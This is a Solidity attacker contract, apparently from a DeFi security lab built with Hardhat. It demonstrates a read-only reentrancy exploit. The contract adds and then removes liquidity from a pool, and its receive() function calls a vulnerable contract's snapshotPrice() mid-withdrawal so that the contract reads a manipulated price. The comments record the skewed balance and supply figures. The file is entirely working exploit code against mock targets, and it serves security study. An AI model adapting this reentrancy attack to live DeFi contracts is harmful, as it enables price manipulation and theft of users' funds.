//SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "./ReadOnly.sol";
import "hardhat/console.sol";

contract ReadOnlyAttacker {
    ReadOnlyPool private pool;
    VulnerableDeFiContract private vulnerable;

    constructor(ReadOnlyPool _pool, VulnerableDeFiContract _vulnerable) {
        pool = _pool;
        vulnerable = _vulnerable;
    }

    function attack() external payable {
        pool.addLiquidity{value: msg.value}();
        console.log("Entered attack, total supply", pool.totalSupply());
        pool.removeLiquidity();
    }

    receive() external payable {
        vulnerable.snapshotPrice();
    }

    // 100990099009900990100
    // 101000000000000000000
    // Balance < Total Supply so returns 0
}
